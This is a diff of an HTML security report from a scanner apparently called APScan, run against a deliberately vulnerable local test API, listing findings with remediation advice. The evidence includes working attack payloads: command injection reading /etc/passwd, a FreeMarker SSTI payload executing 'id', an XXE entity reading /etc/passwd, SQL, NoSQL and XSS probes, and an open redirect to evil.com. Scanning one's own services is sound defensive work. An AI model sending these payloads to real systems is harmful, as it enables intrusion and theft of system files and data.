@@ -16,62 +16,14 @@
         <body>
             <h1>APScan Security Report</h1>
             <div class="summary">
-                <p><strong>Target:</strong> http://localhost:8000</p>
-                <p><strong>Total Findings:</strong> 14</p>
+                <p><strong>Target:</strong> http://127.0.0.1:8000/openapi.json</p>
+                <p><strong>Total Findings:</strong> 84</p>
             </div>
             <h2>Findings</h2>
         
-            <div class="finding medium">
-                <h3>[MEDIUM] Stack Trace Leak (2 occurrences)</h3>
-                <p><strong>Description:</strong> Stack trace leaked in 500 response.</p>
-                <p><strong>Impact:</strong> Unknown</p>
-                <p><strong>Recommendation:</strong> Disable verbose error messages in production.</p>
-                
-                <details>
-                    <summary>View Affected Endpoints & Evidence</summary>
-                    <ul>
-            
-                    <li>
-                        <strong>POST /api/stack_trace</strong>
-                        <pre>Matched pattern: Traceback \(most recent call last\):
-Response snippet: {"error":"ISE","trace":"Traceback (most recent call last): ..."}...</pre>
-                        
-                    </li>
-                 
-                    <li>
-                        <strong>POST /api/stack_trace</strong>
-                        <pre>Matched pattern: Traceback \(most recent call last\):
-Response snippet: {"error":"ISE","trace":"Traceback (most recent call last): ..."}...</pre>
-                        
-                    </li>
-                 
-                    </ul>
-                </details>
-            </div>
-            
-            <div class="finding low">
-                <h3>[LOW] Unsafe HTTP Methods (1 occurrences)</h3>
-                <p><strong>Description:</strong> Method TRACE is enabled.</p>
-                <p><strong>Impact:</strong> Unknown</p>
-                <p><strong>Recommendation:</strong> Disable the TRACE method in server configuration.</p>
-                
-                <details>
-                    <summary>View Affected Endpoints & Evidence</summary>
-                    <ul>
-            
-                    <li>
-                        <strong>TRACE /api/unsafe</strong>
-                        <pre>Received 200 OK for TRACE (Headers reflected in body - Cross Site Tracing risk)</pre>
-                        
-                    </li>
-                 
-                    </ul>
-                </details>
-            </div>
-            
             <div class="finding high">
-                <h3>[HIGH] Unauthenticated Access (3 occurrences)</h3>
-                <p><strong>Description:</strong> Endpoint /api/pollute is accessible without authentication.</p>
+                <h3>[HIGH] Unauthenticated Access (13 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint /users/{user_id} is accessible without authentication.</p>
                 <p><strong>Impact:</strong> Unauthorized actors can access sensitive data or perform actions.</p>
                 <p><strong>Recommendation:</strong> Implement proper authentication middleware (e.g., OAuth2, API Key) for this endpoint.</p>
                 
@@ -80,8 +32,44 @@ Response snippet: {"error":"ISE","trace":"Traceback (most recent call last): ...
                     <ul>
             
                     <li>
-                        <strong>POST /api/pollute</strong>
-                        <pre>Received 200 OK with body: {}...</pre>
+                        <strong>GET /users/{user_id}</strong>
+                        <pre>Received 200 OK with body: {"user_id":1,"username":"admin","email":"admin@example.com","role":"admin"}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /products</strong>
+                        <pre>Received 200 OK with body: {"products":["item1","item2"]}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /search</strong>
+                        <pre>Received 200 OK with body: {"results":[],"query":"test_value"}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /graphql</strong>
+                        <pre>Received 200 OK with body: {"data":{"result":"success"}}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/parse_xml</strong>
+                        <pre>Received 200 OK with body: {"message":"parsed"}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /old</strong>
+                        <pre>Received 200 OK with body: {"message":"This is a deprecated endpoint","status":"active"}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Received 200 OK with body: {"users":[{"id":1,"email":"admin@example.com","ssn":"123-45-6789"},{"id":2,"email":"user@test.com","credit_card":"4111 2222 3333 4444"}]}...</pre>
                         
                     </li>
                  
@@ -92,9 +80,200 @@ Response snippet: {"error":"ISE","trace":"Traceback (most recent call last): ...
                     </li>
                  
                     <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Received 200 OK with body: {"echo":"unsafe"}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/pollute</strong>
+                        <pre>Received 200 OK with body: {}...</pre>
+                        
+                    </li>
+                 
+                    <li>
                         <strong>GET /robots.txt</strong>
                         <pre>Received 200 OK with body: User-agent: *
 Disallow: /admin...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Received 200 OK with body: {"aws_access_key":"AKIAIOSFODNN7EXAMPLE","private_key":"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEA..."}...</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>Received 200 OK with body: {"name":"vulnerable-app","dependencies":{"express":"4.17.1"}}...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Broken Object Level Authorization (Read) (1 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint accessible with multiple object IDs (user_id).</p>
+                <p><strong>Impact:</strong> Attackers can access unauthorized data objects.</p>
+                <p><strong>Recommendation:</strong> Implement object-level ownership checks.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /users/{user_id}</strong>
+                        <pre>ID 1: 200 OK (75b)
+ID 1337: 200 OK (78b)</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding low">
+                <h3>[LOW] Leaked Version Header: Server (22 occurrences)</h3>
+                <p><strong>Description:</strong> The server exposes software version information via the Server header.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Configure the server to suppress version headers.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /admin</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /products</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /search</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /users/{user_id}</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /graphql</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /jwt-protected</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/ping</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/render</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/products</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/parse_xml</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/login</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/profile</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/upload</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /redirect</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /old</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACE /api/unsafe</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/pollute</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /robots.txt</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Server: uvicorn</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>Server: uvicorn</pre>
                         
                     </li>
                  
@@ -114,79 +293,7 @@ Disallow: /admin...</pre>
             
                     <li>
                         <strong>GET /robots.txt</strong>
-                        <pre>File exists at http://localhost:8000/robots.txt (200 OK)</pre>
-                        
-                    </li>
-                 
-                    </ul>
-                </details>
-            </div>
-            
-            <div class="finding low">
-                <h3>[LOW] Missing Security Headers (2 occurrences)</h3>
-                <p><strong>Description:</strong> Response missing security headers: X-Content-Type-Options, Strict-Transport-Security, Content-Security-Policy.</p>
-                <p><strong>Impact:</strong> Reduced defense against XSS, clickjacking, and MITM.</p>
-                <p><strong>Recommendation:</strong> Configure your web server/gateway to send standard security headers.</p>
-                
-                <details>
-                    <summary>View Affected Endpoints & Evidence</summary>
-                    <ul>
-            
-                    <li>
-                        <strong>TRACE /api/unsafe</strong>
-                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
-                        
-                    </li>
-                 
-                    <li>
-                        <strong>GET /robots.txt</strong>
-                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
-                        
-                    </li>
-                 
-                    </ul>
-                </details>
-            </div>
-            
-            <div class="finding low">
-                <h3>[LOW] Lack of Rate Limiting (2 occurrences)</h3>
-                <p><strong>Description:</strong> Endpoint does not appear to enforce rate limiting (no 429s or headers observed).</p>
-                <p><strong>Impact:</strong> Susceptible to Denial of Service (DoS) or Brute Force.</p>
-                <p><strong>Recommendation:</strong> Implement rate limiting middleware (e.g. 100/minute).</p>
-                
-                <details>
-                    <summary>View Affected Endpoints & Evidence</summary>
-                    <ul>
-            
-                    <li>
-                        <strong>TRACE /api/unsafe</strong>
-                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
-                        
-                    </li>
-                 
-                    <li>
-                        <strong>GET /robots.txt</strong>
-                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
-                        
-                    </li>
-                 
-                    </ul>
-                </details>
-            </div>
-            
-            <div class="finding info">
-                <h3>[INFO] Custom Hello Rule (1 occurrences)</h3>
-                <p><strong>Description:</strong> Custom rule execution confirmed.</p>
-                <p><strong>Impact:</strong> Unknown</p>
-                <p><strong>Recommendation:</strong> None</p>
-                
-                <details>
-                    <summary>View Affected Endpoints & Evidence</summary>
-                    <ul>
-            
-                    <li>
-                        <strong>GET /</strong>
-                        <pre>Plugin system active.</pre>
+                        <pre>File exists at http://127.0.0.1:8000/robots.txt (200 OK)</pre>
                         
                     </li>
                  
@@ -196,7 +303,7 @@ Disallow: /admin...</pre>
             
             <div class="finding info">
                 <h3>[INFO] Shadow API Detection (2 occurrences)</h3>
-                <p><strong>Description:</strong> Found potential shadow or undocumented API location: http://localhost:8000/old</p>
+                <p><strong>Description:</strong> Found potential shadow or undocumented API location: http://127.0.0.1:8000/old</p>
                 <p><strong>Impact:</strong> Unknown</p>
                 <p><strong>Recommendation:</strong> Ensure all API endpoints are documented and deprecated versions are disabled.</p>
                 
@@ -206,13 +313,606 @@ Disallow: /admin...</pre>
             
                     <li>
                         <strong>GET /old</strong>
-                        <pre>Received 200 OK for http://localhost:8000/old</pre>
+                        <pre>Received 200 OK for http://127.0.0.1:8000/old</pre>
                         
                     </li>
                  
                     <li>
                         <strong>GET /admin</strong>
-                        <pre>Received 200 OK for http://localhost:8000/admin</pre>
+                        <pre>Received 200 OK for http://127.0.0.1:8000/admin</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding critical">
+                <h3>[CRITICAL] SQL Injection (Error-Based) (1 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint returns database error messages when injecting '''.</p>
+                <p><strong>Impact:</strong> Full database compromise, data leakage, data loss.</p>
+                <p><strong>Recommendation:</strong> Use parametrized queries (Prepared Statements) for all DB access.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /products</strong>
+                        <pre>Payload: '
+Matched Error: SQL syntax.*MySQL
+Response Snippet: "Internal Server Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Exposed Configuration File: /package.json (1 occurrences)</h3>
+                <p><strong>Description:</strong> The file /package.json is publicly accessible.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Configure the web server to deny access to configuration files.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>Accessed http://127.0.0.1:8000/package.json successfully.</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Reflected XSS (1 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint reflects user input without encoding (Reflected XSS).</p>
+                <p><strong>Impact:</strong> Attackers can execute malicious scripts in user's browser.</p>
+                <p><strong>Recommendation:</strong> Context-aware output encoding (e.g. HTML entity encoding).</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /search</strong>
+                        <pre>Payload: <script>alert('APScan')</script>
+Response contains raw payload.</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding critical">
+                <h3>[CRITICAL] Command Injection (CMDi) (2 occurrences)</h3>
+                <p><strong>Description:</strong> Possible OS Command Injection detected using payload '& ping -c 1 127.0.0.1'.</p>
+                <p><strong>Impact:</strong> Remote Code Execution (RCE), Full System Compromise.</p>
+                <p><strong>Recommendation:</strong> Avoid system calls with user input. Use safe APIs or strictly validate input (allowlist).</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /search</strong>
+                        <pre>Payload: & ping -c 1 127.0.0.1
+Matched Signature: 127\.0\.0\.1
+Response Snippet: {"results":[],"query":"& ping -c 1 127.0.0.1"}</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/ping</strong>
+                        <pre>Payload: ; cat /etc/passwd
+Matched Signature: root:x:0:0
+Response Snippet: Pinging... 
+root:x:0:0:root:/root:/bin/bash
+uid=0(root) gid=0(root)</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Server-Side Template Injection (SSTI) (3 occurrences)</h3>
+                <p><strong>Description:</strong> Template Injection detected. Server evaluated '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}'.</p>
+                <p><strong>Impact:</strong> Remote Code Execution (RCE) via template engine sandbox escape.</p>
+                <p><strong>Recommendation:</strong> Use logic-less templates or disable template evaluation of user input.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /search</strong>
+                        <pre>Payload: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+Matched: freemarker\.template
+Response Snippet: {"results":[],"query":"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}"}</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/render</strong>
+                        <pre>Payload: {{7*7}}
+Matched: Evaluated '7*7' to '49'
+Response Snippet: Output: 49</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/ping</strong>
+                        <pre>Payload: {php}echo 7*7;{/php}
+Matched: uid=[0-9]+\(
+Response Snippet: Pinging... 
+root:x:0:0:root:/root:/bin/bash
+uid=0(root) gid=0(root)</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] NoSQL Injection (3 occurrences)</h3>
+                <p><strong>Description:</strong> NoSQL Injection detected. Database error returned.</p>
+                <p><strong>Impact:</strong> Data leakage, Authentication Bypass in NoSQL DBs.</p>
+                <p><strong>Recommendation:</strong> Sanitize input, avoid passing user input directly to MongoDB query ops.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>POST /api/ping</strong>
+                        <pre>Payload: {'$where': 'return true'}
+Matched: DB Error: \$where
+Response Snippet: {"detail":[{"type":"string_type","loc":["body","cmd"],"msg":"Input should be a valid string","input":{"$where":"return true"}}]}</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/render</strong>
+                        <pre>Payload: {'$where': 'return true'}
+Matched: DB Error: \$where
+Response Snippet: {"detail":[{"type":"string_type","loc":["body","template"],"msg":"Input should be a valid string","input":{"$where":"return true"}}]}</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>POST /api/products</strong>
+                        <pre>Payload: {'$ne': None}
+Matched: DB Error: MongoError
+Response Snippet: MongoError: Expected string, got object</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding critical">
+                <h3>[CRITICAL] XML External Entity (XXE) (1 occurrences)</h3>
+                <p><strong>Description:</strong> XML External Entity (XXE) vulnerability detected. Server parsed external entity.</p>
+                <p><strong>Impact:</strong> File Disclosure (LFI), SSRF, DoS.</p>
+                <p><strong>Recommendation:</strong> Disable DTD processing and external entities in your XML parser config.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>POST /api/parse_xml</strong>
+                        <pre>Payload: <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+Matched: root:x:0:0
+Response Snippet: root:x:0:0:root:/root:/bin/bash</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding low">
+                <h3>[LOW] Lack of Rate Limiting (8 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint does not appear to enforce rate limiting (no 429s or headers observed).</p>
+                <p><strong>Impact:</strong> Susceptible to Denial of Service (DoS) or Brute Force.</p>
+                <p><strong>Recommendation:</strong> Implement rate limiting middleware (e.g. 100/minute).</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>POST /api/parse_xml</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /old</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACE /api/unsafe</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /robots.txt</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>Sent 10 requests, all successful, no X-RateLimit headers.</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding low">
+                <h3>[LOW] Missing Security Headers (8 occurrences)</h3>
+                <p><strong>Description:</strong> Response missing security headers: X-Content-Type-Options, Strict-Transport-Security, Content-Security-Policy.</p>
+                <p><strong>Impact:</strong> Reduced defense against XSS, clickjacking, and MITM.</p>
+                <p><strong>Recommendation:</strong> Configure your web server/gateway to send standard security headers.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>POST /api/parse_xml</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /old</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACE /api/unsafe</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /robots.txt</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Headers received: ['date', 'server', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>Headers received: ['date', 'server', 'x-powered-by', 'content-length', 'content-type']</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding medium">
+                <h3>[MEDIUM] Open Redirect (1 occurrences)</h3>
+                <p><strong>Description:</strong> Parameter 'url' reflects input in Location header, allowing open redirects.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Validate all redirect targets against a whitelist of allowed domains.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /redirect</strong>
+                        <pre>Payload: http://evil.com
+Location: http://evil.com</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Excessive Data Exposure (2 occurrences)</h3>
+                <p><strong>Description:</strong> Endpoint exposes sensitive data matching pattern "ssn"\s*:.</p>
+                <p><strong>Impact:</strong> Leakage of PII or credentials.</p>
+                <p><strong>Recommendation:</strong> Filter sensitive fields from the response DTO.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Matched pattern: "ssn"\s*: in response.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched pattern: "private_key"\s*: in response.</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Email Address Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains suspected Email Address.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Ensure sensitive PII is masked or encrypted.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Matched pattern: admin@example.com...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] US SSN Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains suspected US SSN.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Ensure sensitive PII is masked or encrypted.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Matched pattern: 123-45-6789...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Credit Card Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains suspected Credit Card.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Ensure sensitive PII is masked or encrypted.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Matched pattern: 4111 2222 3333 4444...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Broken Function Level Authorization (2 occurrences)</h3>
+                <p><strong>Description:</strong> Sensitive endpoint accessible by current user: /api/users_pii</p>
+                <p><strong>Impact:</strong> Low-privileged users might perform administrative actions.</p>
+                <p><strong>Recommendation:</strong> Ensure ACLs deny access to this function for standard users.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/users_pii</strong>
+                        <pre>Matched keyword in path and received 200.</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched keyword in path and received 200.</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding low">
+                <h3>[LOW] Unsafe HTTP Methods (4 occurrences)</h3>
+                <p><strong>Description:</strong> Method TRACE is enabled.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Disable the TRACE method in server configuration.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>TRACE /api/unsafe</strong>
+                        <pre>Received 200 OK for TRACE (Headers reflected in body - Cross Site Tracing risk)</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Received 200 OK for TRACK</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACE /api/unsafe</strong>
+                        <pre>Received 200 OK for TRACE (Headers reflected in body - Cross Site Tracing risk)</pre>
+                        
+                    </li>
+                 
+                    <li>
+                        <strong>TRACK /api/unsafe</strong>
+                        <pre>Received 200 OK for TRACK</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding critical">
+                <h3>[CRITICAL] AWS Access Key Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains a potential AWS Access Key.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Rotate the exposed key immediately and remove it from the code/response.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched pattern: AKIAIOSFODNN7EXAMPLE</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding critical">
+                <h3>[CRITICAL] Generic Private Key Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains a potential Generic Private Key.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Rotate the exposed key immediately and remove it from the code/response.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched pattern: -----BEGIN RSA PRIVATE KEY-----</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] AWS API Key Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains suspected AWS API Key.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Ensure sensitive PII is masked or encrypted.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched pattern: AKIAIOSFODNN7EXAMPLE...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding high">
+                <h3>[HIGH] Private Key Exposure (1 occurrences)</h3>
+                <p><strong>Description:</strong> Response contains suspected Private Key.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Ensure sensitive PII is masked or encrypted.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /api/config_secrets</strong>
+                        <pre>Matched pattern: RSA...</pre>
+                        
+                    </li>
+                 
+                    </ul>
+                </details>
+            </div>
+            
+            <div class="finding low">
+                <h3>[LOW] Leaked Version Header: X-Powered-By (1 occurrences)</h3>
+                <p><strong>Description:</strong> The server exposes software version information via the X-Powered-By header.</p>
+                <p><strong>Impact:</strong> Unknown</p>
+                <p><strong>Recommendation:</strong> Configure the server to suppress version headers.</p>
+                
+                <details>
+                    <summary>View Affected Endpoints & Evidence</summary>
+                    <ul>
+            
+                    <li>
+                        <strong>GET /package.json</strong>
+                        <pre>X-Powered-By: Express/4.17.1</pre>
                         
                     </li>
                  
